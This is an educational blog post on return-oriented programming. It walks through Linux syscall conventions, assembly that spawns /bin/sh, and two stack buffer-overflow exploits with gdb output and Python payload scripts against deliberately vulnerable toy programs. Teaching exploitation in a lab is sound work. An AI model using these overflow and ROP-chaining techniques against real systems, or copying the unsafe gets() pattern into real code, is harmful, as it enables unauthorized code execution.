---
layout: post
comments: false
title: Return Oriented Programming - Part2
categories: Reverse Engineering and Binary Exploitation Series
---

Hello fellow pwners!

In the [previous post](/reverse/engineering/and/binary/exploitation/series/2019/01/16/return-oriented-programming-part1.html), we discussed what Return Oriented programming is and answered important questions like what does ROP aim to achieve, which security measure does it bypass. We discussed the theory behind ROP. 

In this post, we will take up a few executables and do some practicals to understand ROP better. 

This is the 17th post of this series. Create a directory **post_17** in **rev_eng_series** directory. 

Lets get started!

## 1. An important note about executing system calls

If you know what system calls are, how they are executed by 32-bit and 64-bit programs, you can skip this section.

We have seen what system calls are. System Calls are function calls inside the Operating System. If any userspace program wants to talk to the kernel about something, then it has to be through System Calls. 

Suppose your program has a printf statement like this: ```printf("Hello World!");```. You execute the program, and ```Hello World!``` gets printed on your terminal. How exactly did it get printed? let us discuss that in short.

We know that the Operating System is a very complex resource manager. Examples of resources are RAM, Hard-Disk, Monitor(Input and Output). Suppose your program wants to print ```Hello World!``` on the monitor. This means, your program wants that resource(monitor) to itself for some period of time. If a program wants to use a resource, it has to **request** the Operating System. Only if there are enough resources, the OS will allocate some for you. When ```printf``` function is called, it internally makes a call to a system call called **write**. ```man write``` for more details. 

Let us take another example. When a program needs some memory at runtime, it will be programmed to call **malloc** or **calloc** functions in C. When **malloc** is called, there are 2 possible end results. It will either return the starting address of allocated memory or it will return **NULL** if there is not enough memory to allocate. 

**malloc** is a C library function which we are familiar with when we need memory at runtime. What this means is, our program needs some extra RAM space. If it needs something, it has to request the OS. Then OS will decide whether to give it or not. 

Internally, **malloc** calls the System Call **mmap**(memory-map). If there is memory to allocate, the requested amount will be allocated. 

In conclusion, if a program wants to use a particular resource or allocate more of a particular resource, it first has to request the Operating System. This request is through execution of **system calls**. If the resource is given to the program, then the request was a successful. Else, it is a failure. 

Now, Let us get to specifics. How exactly is a system call called by the program?

The method used to call a system call by a 32-bit program is very different from how a 64-bit program calls the same system call. 

There is a specific convention to be followed. 

# System Call convention

In 32-bit programs, this is the convention.

```
eax <- System Call Number
ebx <- First Argument
ecx <- Second Argument
edx <- Third Argument

After loading arguments, 

execute the special instruction "int 0x80"
```

We know system calls by their names - write, read, execve, exit, mmap etc., But programs and Operating System know them by numbers. 

Every System Call is assigned a **unique** number. You can find this systemcall-number mapping in the following file. 

```
/usr/include/x86_64-linux-gnu/asm}=)> cat unistd_32.h 
#ifndef _ASM_X86_UNISTD_32_H
#define _ASM_X86_UNISTD_32_H 1

#define __NR_restart_syscall 0
#define __NR_exit 1
#define __NR_fork 2
#define __NR_read 3
#define __NR_write 4
#define __NR_open 5
#define __NR_close 6
#define __NR_waitpid 7
#define __NR_creat 8
#define __NR_link 9
#define __NR_unlink 10
#define __NR_execve 11
#define __NR_chdir 12
#define __NR_time 13
#define __NR_mknod 14
#define __NR_chmod 15
#define __NR_lchown 16
#define __NR_break 17
#define __NR_oldstat 18
#define __NR_lseek 19
#define __NR_getpid 20
#define __NR_mount 21
#define __NR_umount 22
#define __NR_setuid 23
#define __NR_getuid 24
#define __NR_stime 25
#define __NR_ptrace 26
#define __NR_alarm 27
#define __NR_oldfstat 28
#define __NR_pause 29
#define __NR_utime 30
#define __NR_stty 31
#define __NR_gtty 32
#define __NR_access 33
```

Look at the above list. It gives the system call name and it's corresponding number. 

As of now, there are **376** system calls in **32-bit Linux**. 

In 64-bit programs, this is the convention. 

```
rax <- System Call number
rdi <- First argument
rsi <- Second argument
rdx <- Third argument

execute the special instruction "syscall"
```

The following is the systemcall-number list for **64-bit linux**. 

```
/usr/include/x86_64-linux-gnu/asm}=)> cat unistd_64.h 
#ifndef _ASM_X86_UNISTD_64_H
#define _ASM_X86_UNISTD_64_H 1

#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_close 3
#define __NR_stat 4
#define __NR_fstat 5
#define __NR_lstat 6
#define __NR_poll 7
#define __NR_lseek 8
#define __NR_mmap 9
#define __NR_mprotect 10
#define __NR_munmap 11
#define __NR_brk 12
#define __NR_rt_sigaction 13
#define __NR_rt_sigprocmask 14
#define __NR_rt_sigreturn 15
#define __NR_ioctl 16
#define __NR_pread64 17
#define __NR_pwrite64 18
#define __NR_readv 19
#define __NR_writev 20
#define __NR_access 21
#define __NR_pipe 22
#define __NR_select 23
#define __NR_sched_yield 24
```

As of now, there are 325 system calls in 64-bit Linux systems. 

There are 2 scenarios here. 

# 1. Consider a 32-bit linux system

In a 32-bit linux system, only the first list will be available. Only 32-bit programs can run on those 32-bit systems. The second is not available because of a simple reason that a 64-bit program cannot be run on a 32-bit program. 

So, first convention is the only convention used. 

# 2. Consider a 64-bit linux system

Here, there are 2 scenarios. 

Note that both 32-bit and 64-bit programs can be run on a 64-bit system.

Suppose a 32-bit program is run. It is again straight forward. Only the first convention is used.

Suppose a 64-bit program is run. Here is where our discussion starts. 

The standard way is to use the second convention. Because that is the prescribed by the Operating System. Load System Call number into rax, arguments into rdi, rsi, rdx and execute **syscall**. 

But is this the only way to do it? 

Nope. The first convention can also be used. 

You can do the following also. 

```
rax <- System Call number in 32-bit List
rbx <- First argument
rcx <- Second argument
rdx <- Third argument

execute "int 0x80"
```
Note the difference here. It is a 64-bit program. We are using 64-bit registers here. But a system call is being called as if a 32-bit program is calling the system call.

An example would help us understand this better. 

# The "execve" example

Let us write assembly programs to get a shell.

1. **32-bit** execve program 

```
rev_eng_series/post_17}=)> cat shell_32.asm 
section .data
	
str: db "/bin/sh", 0x00

section .text
	global _start

_start: 
	mov eax, 11
	mov ebx, str
	mov ecx, 0
	mov edx, 0
	int 0x80
```

Let us assemble and link it to get a **32-bit executable**. 

```
rev_eng_series/post_17}=)> nasm shell_32.asm -f elf32
rev_eng_series/post_17}=)> ld shell_32.o -o shell_32 -m elf_i386
rev_eng_series/post_17}=)> ./shell_32
$ whoami
adwi
$ 
```
Whether you run it on a 32-bit Linux system or a 64-bit system, it is the same. Because in both systems, a 32-bit program is being run. So, only one convention is used - that is the first convention. 

2. **64-bit** execve program

The standard way to write this program is to use the 64-bit system call convention. 

```
rev_eng_series/post_17}=)> cat shell64_64.asm 
section .data

str: db "/bin/sh", 0x00

section .text
	global _start

_start: 
	mov rax, 59         ; Refer to that file to get it's system call number
	mov rdi, str
	mov rsi, 0
	mov rdx, 0
	syscall
rev_eng_series/post_17}=)> nasm shell64_64.asm -f elf64
rev_eng_series/post_17}=)> ld shell64_64.o -o shell64_64
```

This generates a 64-bit executable. Look at the format. It is **elf64** - 64-bit ELF object file. 

Let us run it. 

```
rev_eng_series/post_17}=)> ./shell64_64 
$ whoami
adwi
$ 
```

This works. And it is intended to work because we used the 64-bit system call convention in a 64-bit program and ran it. 

Now, let us do the experiment. We will follow the 32-bit convention and generate a 64-bit executable. Let us see if we get a shell or an error. 

```
rev_eng_series/post_17}=)> cat shell64_32.asm 
section .data

str: db "/bin/sh", 0x00

section .text
	global _start

_start: 
	mov rax, 11
	mov rbx, str
	mov rcx, 0
	mov rdx, 0
	int 0x80
```

You can observe the differences. The system call numbers are different in 32-bit and 64-bit conventions. The argument-registers are different. The special instruction executed to run the system call is different. 

The above is a 64-bit program which will run the system call using 32-bit convention. 

Let us assemble it, link it and run it. Let us see what we get. 

```
/rev_eng_series/post_17}=)> nasm shell64_32.asm -f elf64
rev_eng_series/post_17}=)> ld shell64_32.o -o shell64_32
rev_eng_series/post_17}=)> ./shell64_32
$ whoami
adwi
$ 
```

Bingo! We got a shell!

So, 64-bit systems allow 32-bit style system calls. 

Note that this should not be used while standard programs because this is slow and deprecated. When a 64-bit program wants to execute a system call, it **must** use the 64-bit convention. 

Why did  we discuss it then?

What we spoke was from an **exploit development** perspective. You should be aware of the possibilities you have. I just wanted you to understand there both conventions can be used to execute system calls in 64-bit systems. You will see why this is important in a while when we take up examples to understand ROP.

Note that the 2 conventions are very different. System Call numbers for the same system call is different in the 2 conventions. Take the **write** system call. In 32-bit systems, it's number is 4. But in 64-bit systems, it is 1. For **execve**, in 32-bit systems, it's number is 11. But it is 59 in 64-bit systems.

I urge you to look at those files again. Look at what different system calls are present. We will be using a few of them to write different exploits.

Now, let us get back to ROP practicals. 

We will start with a very simple example which will help us understand the basics and then slowly move towards real-life type examples. 

## Example - 1

We will be using the following program: 
```c
rev_eng_series/post_17}=)> cat code1.c
#include<stdio.h>
#include<unistd.h>

void getshell() {

	printf("Get Shell executed!\n");
	execve("/bin/sh", 0, 0);
}


void func() {

	char buffer[100];
	gets(buffer);
}

int main() {

	func();	
	return 0;
}
```

Objective is simple. You have to get a shell by executing that ```getshell()``` function. Note that W^X and ASLR are **enabled**. So, injecting shellcode, Ret2Libc are not feasible options. 

Let us compile it and get the executable. 
```
rev_eng_series/post_17}=)> gcc code1.c -o code1 -fno-stack-protector
```
We have compiled the program without Stack Cookie. 

I will be discussing this example with a 64-bit executable, but the technique remains the same for 32-bit. I am sure you can follow this. 

Let us design the exploit first and then write it. 

### 1. Finding the vulnerability. 

1. It is very straight forward. The **func()** function has a BOF due to the use of **gets**. 

### 2. Designing the exploit

1. The BOF will allow us to hijack the **Control Flow** as it allows us to **overwrite** the Return Address with any address we want. 

2. We need to execute ```getshell()``` function. 

3. So, we overwrite the ReturnAddress of **func()** with **getshell()**'s address. 

### 3. Writing the exploit

1. First step is to find the amount of junk to be put. That is the space between buffer's starting address and address where Return Address is stored on stack. 

* Consider the following diagram(for 64-bit executables)

	```
	< buffer - 100 bytes > < padding - some bytes > < old base pointer - 8 bytes > <Return Address - 8 bytes >
    ^                                                                             ^
	|                                                                             |
	|                                                                             |
	A                                                                             B
	```

* Point A is buffer's starting address. 
* Point B is Stack Address where Return Address of the function is stored. 

* We do not care what is present till point B. So, that is the amount of junk we have to fill in. We now don't know the gap between points A and B. The goal of this step is to find it.



* Let us open up the program with gdb and find it. 

	```c
	rev_eng_series/post_17}=)> gdb -q code1
	Reading symbols from code1...(no debugging symbols found)...done.
	gdb-peda$ disass func
	Dump of assembler code for function func:
	0x00000000004005db <+0>:	push   rbp
	0x00000000004005dc <+1>:	mov    rbp,rsp
	0x00000000004005df <+4>:	sub    rsp,0x70
	0x00000000004005e3 <+8>:	lea    rax,[rbp-0x70]
	0x00000000004005e7 <+12>:	mov    rdi,rax
	0x00000000004005ea <+15>:	mov    eax,0x0
	0x00000000004005ef <+20>:	call   0x4004a0 <gets@plt>
	0x00000000004005f4 <+25>:	nop
	0x00000000004005f5 <+26>:	leave  
	0x00000000004005f6 <+27>:	ret    
	End of assembler dump.
	gdb-peda$ b *0x00000000004005db
	Breakpoint 1 at 0x4005db

	```
* We have set a breakpoint at func()'s first instruction. Just before it is executed, the Return Address is on top of stack. We can capture the Stack Address where Return Address is present. 

* Never forget that these addresses might be different for you, but the technique is the same. 

	```
	gdb-peda$ run
	```

* The following is the stack just before **func()** is executed. 

	```c
	[------------------------------------stack-------------------------------------]
	0000| 0x7fffffffd9e8 --> 0x400605 (<main+14>:	mov    eax,0x0)
	0008| 0x7fffffffd9f0 --> 0x400610 (<__libc_csu_init>:	push   r15)
	0016| 0x7fffffffd9f8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
	0024| 0x7fffffffda00 --> 0x0 
	0032| 0x7fffffffda08 --> 0x7fffffffdad8 --> 0x7fffffffdee0 ("/home/adwi/ALL/rev_eng_series/post_17/code1")
	0040| 0x7fffffffda10 --> 0x100000000 
	0048| 0x7fffffffda18 --> 0x4005f7 (<main>:	push   rbp)
	0056| 0x7fffffffda20 --> 0x0 
	[------------------------------------------------------------------------------]
	Legend: code, data, rodata, value

	Breakpoint 1, 0x00000000004005db in func ()
	gdb-peda$
	```
* The **StackAddress = 0x7fffffffd9e8** - We got the address of Point B(refering to that diagram above).

* Now, let us run the program till ```gets()``` is executed. This is because the buffer's starting address is passed as an argument to gets(). We can get that information there. 

* The following is the state in gdb just before **gets()** is executed. 

	```c
	[----------------------------------registers-----------------------------------]
	`RAX: 0x0 
	RBX: 0x0 
	RCX: 0x0 
	RDX: 0x7fffffffdae8 --> 0x7fffffffdf0c ("XDG_VTNR=7")
	RSI: 0x7fffffffdad8 --> 0x7fffffffdee0 ("/home/adwi/ALL/rev_eng_series/post_17/code1")
	RDI: 0x7fffffffd970 --> 0x0 
	RBP: 0x7fffffffd9e0 --> 0x7fffffffd9f0 --> 0x400610 (<__libc_csu_init>:	push   r15)
	RSP: 0x7fffffffd970 --> 0x0 
	RIP: 0x4005ef (<func+20>:	call   0x4004a0 <gets@plt>)
	R8 : 0x400680 (<__libc_csu_fini>:	repz ret)
	R9 : 0x7ffff7de7ac0 (<_dl_fini>:	push   rbp)
	R10: 0x846 
	R11: 0x7ffff7a2d740 (<__libc_start_main>:	push   r14)
	R12: 0x4004c0 (<_start>:	xor    ebp,ebp)
	R13: 0x7fffffffdad0 --> 0x1 
	R14: 0x0 
	R15: 0x0
	EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
	[-------------------------------------code-------------------------------------]
	0x4005e3 <func+8>:	lea    rax,[rbp-0x70]
	0x4005e7 <func+12>:	mov    rdi,rax
	0x4005ea <func+15>:	mov    eax,0x0
	=> 0x4005ef <func+20>:	call   0x4004a0 <gets@plt>
	0x4005f4 <func+25>:	nop
	0x4005f5 <func+26>:	leave  
	0x4005f6 <func+27>:	ret    
	0x4005f7 <main>:	push   rbp
	Guessed arguments:
	arg[0]: 0x7fffffffd970 --> 0x0 
	[------------------------------------stack-------------------------------------]
	0000| 0x7fffffffd970 --> 0x0 
	0008| 0x7fffffffd978 --> 0x0 
	0016| 0x7fffffffd980 --> 0x0 
	0024| 0x7fffffffd988 --> 0x0 
	0032| 0x7fffffffd990 --> 0x0 
	0040| 0x7fffffffd998 --> 0x0 
	0048| 0x7fffffffd9a0 --> 0x0 
	0056| 0x7fffffffd9a8 --> 0x0 
	[------------------------------------------------------------------------------]
	Legend: code, data, rodata, value
	0x00000000004005ef in func ()
	gdb-peda$
	```

* As this is a 64-bit executable, arguments will be loaded into registers. First argument is loaded into **rdi**. 

* Register rdi has the value **0x7fffffffd970**. This is buffer's starting address - This is Point A. 

* In 32-bit process, you should find this address at top of the stack. Because arguments are passed using the stack in 32-bit processes. 

* Their difference should give us how much junk we need to load. 

* Buffer's address - ReturnAddress's Stack Address = **0x7fffffffd970 - 0x7fffffffd9e8** = **-120**. So, **junk_length = 120 bytes**. Note that you can get a different junk length. It depends on the compiler. 

* Along with that, let us find out ```getshell()```'s address. 

	```
	gdb-peda$ disass getshell 
	Dump of assembler code for function getshell:
	0x00000000004005b6 <+0>:	push   rbp
	0x00000000004005b7 <+1>:	mov    rbp,rsp
	0x00000000004005ba <+4>:	mov    edi,0x400694
	0x00000000004005bf <+9>:	call   0x400470 <puts@plt>
	0x00000000004005c4 <+14>:	mov    edx,0x0
	0x00000000004005c9 <+19>:	mov    esi,0x0
	0x00000000004005ce <+24>:	mov    edi,0x4006a8
	0x00000000004005d3 <+29>:	call   0x400490 <execve@plt>
	0x00000000004005d8 <+34>:	nop
	0x00000000004005d9 <+35>:	pop    rbp
	0x00000000004005da <+36>:	ret    
	End of assembler dump.
	gdb-peda$
	```

* **getshell_address = 0x00000000004005b6** 

* Let us start writing the exploit script - **exploit1.py**

* Let us write a function **exploit**. 

	```python
	def exploit() : 

		# Open up gdb or a tool you are comfortable with and find this. 
    	# junk_length = buffer's starting address - ReturnAddress's stack address
		junk_length = 120

		# The variable where complete payload is stored.
		payload = bytes()

		# Initial payload
		# Gap between points A and B
		payload = b'a' * junk_length

		# Change this value to what address you get.
		getshell_address = 0x00000000004005b6
		
		# Address of getshell() in little-endian byte order.
		# For 64-bit executables, 
		payload += struct.pack('<Q', getshell_address)

		# For 32-bit executables, 
		# payload += payload + struct.pack('<I', getshell_address)
	
		# Write the payload into a file - payload.txt
		fo = open("payload.txt", "wb")
		fo.write(payload)
		fo.close()

		print("Payload saved in file: payload.txt")

	```
* Download [exploit1.py from here](/assets/2019-03-30-return-oriented-programming-part2/exploit1.py). The above function is the crux of the exploit.

### 4. Running the exploit

* Let us run the exploit script and inject the payload into **code1**. 

```
	rev_eng_series/post_17}=)> chmod u+x exploit1.py
	rev_eng_series/post_17}=)> ./exploit1.py 
	Payload saved in file: payload.txt
	rev_eng_series/post_17}=)> cat payload.txt - | ./code1

	Get Shell executed!
	whoami
	adwi

	uname 
	Linux
	uname -r
	4.15.0-46-generic
	^C
```

* Bingo! We got the shell!

This example was a pretty easy one. It demonstrated basic control-flow hijacking. This is the foundation for the upcoming examples. Make sure you have understood what we did in this example.

## Example - 2

In the previous example, there was a function we had to jump to and if it gets executed, we would get a shell. 

We will step up a little bit in this example. 

If you are running a 32-bit linux system, [download the program here](/assets/2019-03-30-return-oriented-programming-part2/code2_32.c).                                  
If you are running a 64-bit linux system, [download the program here](/assets/2019-03-30-return-oriented-programming-part2/code2_64.c). 

Note that if you are running a 64-bit system, you can use the 32-bit program also. 

The following is the program for 64-bit systems. 

```c
rev_eng_series/post_17}=)> cat code2_64.c
#include<stdio.h>

char str[] = "/bin//sh";

void inst1() {

	asm("movq $0x3b, %rax");

}

void inst2() {

	asm("lea str, %rdi");
}

void inst3() {

	asm("movq $0, %rsi");
}

void inst4() {

	asm("movq $0, %rdx");
}

void inst5() {

	asm("syscall");
}

void func() {

	char buffer[100];
	gets(buffer);
}

int main() {

	func();

	return 0;
}
rev_eng_series/post_17}=)> gcc code2_64.c -o code2 -fno-stack-protector
code2_64.c: In function ‘func’:
code2_64.c:34:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
  gets(buffer);
  ^
/tmp/ccweDzNw.o: In function `func':
code2_64.c:(.text+0x57): warning: the `gets' function is dangerous and should not be used.

```
It is important to understand this program very carefully. Only then would you know what to do. 

1. There is a **main** function which calls **func()**. 
2. **func()** is vulnerable. It has a BOF. You have to use it and get a shell. 
3. Unlike Example-1, there is **no** readymade function like getshell which will simply give you shell. 
4. What you have is 5 functions which execute **specific** assembly instructions. 

* ```inst1()```: 

	* This function executes ```movl $0x3b, %rax``` instruction. This is **AT&T** assembly syntax. Unlike Intel Syntax, here Operand1 is source and Operand2 is destination.
	* It loads **0x3b** / **59** into **rax** register. It is **execve**'s system call. 
	* In the 32-bit program, ```movl 0xb, %eax``` is executed. It is the same. **0xb/11** is execve's system call in 32-bit Linux. 

* ```inst2()```: 

	* This function executes ```lea str, %rdi```. **str** is ```/bin//sh```.
	* This is the first argument of **execve**. 
	* In the 32-bit program, ```lea str, %ebx``` is executed. 

Like this, read through all the functions and see if you are able to make sense out of it. 

When all those 5 assembly instructions are executed one after the other, **execve** is executed and we get a shell. But here, there is only 1 BOF. We have seen that we can execute 1 function using the BOF. But can we execute 5 functions that too in the order we want?

How do we do it?

We **chain** them. What does that mean?

Let us see. 

Let us execute the instructions in this order: ```inst1()```, ```inst2()```, ```inst3()```, ```inst4()```, ```inst5()```. Note that ```inst5()``` must always be executed at the end because it requests the OS to execute this system call. The other 4 can be executed in any order. 

### 1. Designing and writing the exploit

1. The first thing to do is find the amount of junk to be put. Use gdb or any other tool you like and find it out. 

* In the executable I have, **junk_length** = **120** bytes. 

* Let us start writing the exploit in **exploit2.py**

	```python
	def exploit() :

    # Open up gdb or a tool you are comfortable with and find this. 
    # junk_length = buffer's starting address - ReturnAddress's stack address
    junk_length = 120

    payload = bytes()

    # Initial Payload
    # Gap between point A and point B
    payload = b'a' * junk_length
	```

2. Now, we first want to execute ```inst1()```. So, we put it's address in the payload. 

* Finding ```inst1()```'s address. 

    ```
    rev_eng_series/post_17}=)> objdump -Mintel -d code2 | grep inst1
    0000000000400526 <inst1>:
    ```
* ```inst1()```'s address is **0x0000000000400526**. 

	```python
    # inst1()'s address
    inst1_address = 0x0000000000400526
    # inst1()'s address in little-endian byte order.
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst1_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst1_address)
	```

* At this point, the Return Address of ```func()``` is overwritten by ```inst1()```'s address. 

3. We have to find out how do we execute rest of the functions. 

The following is how the stack looks like: 

	```
	| inst1()'s address | <----- rsp
    |    Some crap      |
    |                   |
    |                   |
    |                   |
	
	```

* When ```func()```'s **ret** is executed, the control goes to address on top of stack. Note that, when a **ret** is executed, the stack is popped. So, after **ret** is executed, the stack looks like this. 

    ```
    |    Some crap      | <----- rsp
    |                   |
    |                   |
    |                   |
    |                   |
    ```
* Now, ```inst1()``` gets executed. As it is a function, it has a **ret** instruction at the end. What happens when that gets executed?

* Control is passed to code at address **Some crap** :P . This would mostly end up in a SegFault because we don't know what is present. 

* Instead of having some crap there, we can have ```inst2()```'s address. This way, control is passed to ```inst2()```. 

* Let us find out ```inst2()```'s address. 

    ```
    rev_eng_series/post_17}=)> objdump -Mintel -d code2 | grep inst2
    0000000000400534 <inst2>:
    ```

* Let us write this in our exploit script. 

    ```python
    # inst2()'s address
    inst2_address = 0x0000000000400534
    # inst2()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst2_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst2_address)
    ```

At this point, the stack looks like this. 


	```
	| inst1()'s address | <----- rsp
    | inst2()'s address |
    | Some other crap   |
    |                   |
    |                   |
	
	```

* What happens after ```inst2()``` is done with execution? It is also a function. It has a return address. It gives the control to code at **Some other crap**. 

* I hope you are getting an idea of what is being done here. Instead of crap being present, we will ```inst3()```'s address there. 

* With the same logic, we will put ```inst4()```'s and ```inst5()```'s addresses onto the stack. 

* Let us update the exploit script.

    ```python
    # inst3()'s address
    inst3_address = 0x0000000000400543
    # inst3()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst3_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst3_address)

    # inst4()'s address
    inst4_address = 0x0000000000400551
    # inst4()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst4_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst4_address)

    # inst5()'s address
    inst5_address = 0x000000000040055f
    # inst5()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst5_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst5_address)
    ```

* Now, the stack looks like this. 

    ```
	| inst1()'s address | <----- rsp
    | inst2()'s address |
    | inst3()'s address |
    | inst4()'s address |
    | inst5()'s address |
	```

* Let us end the script by writing the payload into a file **payload.txt**. 

    ```python
    # Write the payload into a file - payload.txt
    fo = open("payload.txt", "wb")
    fo.write(payload)
    fo.close()
    ```

* You may download the exploit script [here](/assets/2019-03-30-return-oriented-programming-part2/exploit2.py).

### 2. Analysis of exploit

It might be a little confusing if you are doing chaining for the first time. That is why this Analysis. 

After injecting the payload, just before ```func()```'s **ret** is executed, the stack looks like this. 

    ```
	| inst1()'s address | <----- rsp
    | inst2()'s address |
    | inst3()'s address |
    | inst4()'s address |
    | inst5()'s address |
	```

1. **rsp** points to Top of Stack and Top of Stack has ```inst1()```'s address. When ```func()```'s **ret** is executed, the following happens. 


    ```
	| inst1()'s address | <----- rsp                            | inst2()'s address | <----- rsp
    | inst2()'s address |                   func()'s ret        | inst3()'s address |
    | inst3()'s address |                ----------------->     | inst4()'s address |           + Control is transfered to inst1()         
    | inst4()'s address |                                       | inst5()'s address |
    | inst5()'s address |                                       |                   |
	
        Init Stack                                                     Stack2
    ```

    * **rax** is loaded with **execve**'s system call number. 

2. **Stack2** is the current stack state.  At the end of ```inst1()```, **ret** is executed. The following happens. 

    ```
	| inst2()'s address | <----- rsp                            | inst3()'s address | <----- rsp
    | inst3()'s address |                   inst1()'s ret       | inst4()'s address |
    | inst4()'s address |                ----------------->     | inst5()'s address |           + Control is transfered to inst2()         
    | inst5()'s address |                                       |                   |
    |                   |                                       |                   |
	
          Stack2                                                       Stack3
    ```


    * In 32-bit version, **rbx** is loaded with ```/bin//sh```'s address. 
    * In 64-bit version, **rdi** is loaded with ```/bin//sh```'s address.

3. **Stack3** is the current stack state. At the end of ```inst2()```, **ret** is executed. The following happens. 

    ```
	| inst3()'s address | <----- rsp                            | inst4()'s address | <----- rsp
    | inst4()'s address |                   inst2()'s ret       | inst5()'s address |
    | inst5()'s address |                ----------------->     |                   |           + Control is transfered to inst3()         
    |                   |                                       |                   |
    |                   |                                       |                   |
	
          Stack3                                                       Stack4
    ```
    * In 32-bit version, **rcx** is loaded with **0**. 
    * In 64-bit version, **rsi** is loaded with **0**. 

4. **Stack4** is the current stack state. At the end of ```inst3()```, **ret** is executed. The following happens. 


    ```
	| inst4()'s address | <----- rsp                            | inst5()'s address | <----- rsp
    | inst5()'s address |                   inst3()'s ret       |                   |
    |                   |                ----------------->     |                   |           + Control is transfered to inst4()         
    |                   |                                       |                   |
    |                   |                                       |                   |
	
          Stack4                                                       Stack5
    ```

    * In 32-bit version, **rdx** is loaded with **0**. 
    * In 64-bit version, **rdx** is loaded with **0**. 

5. **Stack5** is the current stack state. At the end of ```inst4()```, **ret** is executed. The following happens. 

    ```
	| inst5()'s address | <----- rsp                            |                   | <----- rsp
    |                   |                   inst4()'s ret       |                   |
    |                   |                ----------------->     |                   |           + Control is transfered to inst5()         
    |                   |                                       |                   |
    |                   |                                       |                   |
	
          Stack5                                                       Stack6
    ```

    * In 32-bit version, ```int 0x80``` is executed. 
    * In 64-bit version, ```syscall``` is executed. 


6. **Stack6** is the current stack state. If **execve** is successful, control will never come back. To understand why, we have to discuss what **execve** is in detail which we can discuss in another post. Suppose **execve** fails, control returns back and it probably segfaults because we don't know where control is transfered to.  


That was the step-by-step analysis. I hope you have understood how functions are being chained in a particular order to get what we want - in this case a shell!

### 3. Running the exploit

Now that we are done understanding the exploit, let us run it and inject the payload into the vulnerable executable. Let us see what we get.

```
rev_eng_series/post_17}=)> chmod u+x exploit2.py
rev_eng_series/post_17}=)> ./exploit2.py 
Payload saved in file: payload.txt
rev_eng_series/post_17}=)> cat payload.txt - | ./code2

whoami
adwi

hostname -I
10.53.82.170 192.168.122.1 172.17.0.1 
hostname
adwi

^C
```
And GAME OVER!!

With this, we have seen how functions can be chained to execute in a particular order to get a shell.

## Analysis

In the first example, we saw simple control flow hijacking. That was done to freshen up your basics. 

The second example is where the actual stuff came in. There were 5 functions. We had to execute them in a particular order. 

We wrote a script to generate the input payload.

Let us try co-relating **ROP** with our **Example-2** 

1. Which register was the Instruction pointer?

In ROP, **rsp** is used to **jump** from one gadget to another. But when multiple instructions in a gadget are executed, **rip** is the Instruction Pointer. Let us take an example.

* Consider the 2 gadgets: 

    ```
    gadget1: 
        mov rax, rbx
        inc r15
        dec rsi
        ret
    
    gadget2: 
        add rax, 1
        sub r15, 1
        xor rdx, rdi
        ret
    ```

* I want to execute **gadget1** first and then execute **gadget2**. Consider you have a BOF. How do you do this?

* First, the Return Address of vulnerable function is overwritten with **gadget1**'s address. **gadget1** has a **ret**. So, where do we want it to return? We want it to go to **gadget2**. So, we put **gadget2**'s address also. The following is how the stack would look like just before **ret** of vulnerable function is executed.

    ```
    | gadget1's address | <----- rsp
    | gadget2's address |
    |                   |
    |                   |
    |                   |
    ```

* To jump to **gadget1**, **rsp** is used as Instruction Pointer. But inside **gadget1**, instructions are executed one after the other. For that to happen, **rip** is used as Instruction Pointer.

* In a similar way, to jump to **gadget2**, **rsp** is used as Instruction Pointer. But inside **gadget2**, instructions are executed one after the other => **rip** is used as Instruction Pointer. 


In our example, we did the same exact thing. Only different is, every gadget was a function like this: 

```
inst1() : 
    push rbp
    mov rbp, rsp
    mov rax, 0x3b
    nop
    pop rbp
    ret

inst3() : 
    push rbp
    mov rbp, rsp
    mov rsi, 0
    nop
    pop rbp
    ret
```

So, we actually used ROP to get a shell.

## A few interesting things

1. In the beginning of this post, we discussed different **conventions** used to call a **system call**. Who sets these conventions? 

    * The **ABI** / **Application Binary Interface** specifies it. you can download the document [here](/assets/2019-03-30-return-oriented-programming-part2/mpx-linux64-abi.pdf). It has all such specifications. How a function call should happen, what registers should be used to pass arguments, what if there are too many arguments and much more.

## Conclusion

In this post, we discussed System Calls, how they are identified by programs and the Operating System, different conventions used. 

Later, we looked at 2 examples where we discussed Control-Flow hijacking and ROP Chaining in detail. But both of the examples are handcrafted and it is hard to find such ready-made functions in normal executables. In the next post, we will take up real examples and see what problems arise during the process and how we can solve them to get a shell!

That is it for this post. 

Thank you for reading and happy hacking :)